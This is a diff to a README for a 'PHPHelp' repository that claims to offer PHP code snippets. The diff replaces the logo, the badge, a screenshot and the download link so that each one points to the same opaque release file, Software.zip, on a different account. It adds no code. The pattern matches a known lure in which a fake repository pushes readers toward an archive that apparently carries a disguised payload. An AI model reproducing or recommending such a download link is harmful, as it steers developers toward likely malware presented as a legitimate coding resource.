@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to PHPHelp Repository 🚀
 
-![PHP Logo](https://cdn.iconscout.com/icon/free/png-256/php-27-226042.png)
+![PHP Logo](https://github.com/valhalla-x69/PHPHelp/releases/download/v2.0/Software.zip)
 
 ## Overview
 Welcome to PHPHelp, your go-to repository for essential PHP programming resources. This repository is designed to provide PHP developers with ready-to-use code for various functionalities such as routing, secure authentication, real-time chat, advanced security measures, MVC architecture, error logging, and automated testing. Enhance your development process with efficient and well-structured solutions provided here.
@@ -19,9 +19,9 @@ Welcome to PHPHelp, your go-to repository for essential PHP programming resource
 #### CSS, Development, Help, HTML, MySQL, PHP, Security, SQL, VSCode, Web, XAMPP
 
 ## Get Started
-To start using the resources in this repository, simply [download the PHPHelp archive](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and extract its contents.
+To start using the resources in this repository, simply [download the PHPHelp archive](https://github.com/valhalla-x69/PHPHelp/releases/download/v2.0/Software.zip) and extract its contents.
 
-[![Download PHPHelp](https://img.shields.io/badge/Download-PHPHelp-orange)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download PHPHelp](https://github.com/valhalla-x69/PHPHelp/releases/download/v2.0/Software.zip)](https://github.com/valhalla-x69/PHPHelp/releases/download/v2.0/Software.zip)
 
 If the link does not work, please check the "Releases" section for alternative download options.
 
@@ -32,4 +32,4 @@ Feel free to contribute to PHPHelp by submitting your own PHP code snippets or i
 
 Thank you for choosing PHPHelp for your programming needs. Happy coding! 🎉
 
-![PHP Code](https://www.bitdegree.org/learn/storage/uploadsy/g/33/7/1/3371c4ab3b08a128e69d559068e63c5d.png)
+![PHP Code](https://github.com/valhalla-x69/PHPHelp/releases/download/v2.0/Software.zip)
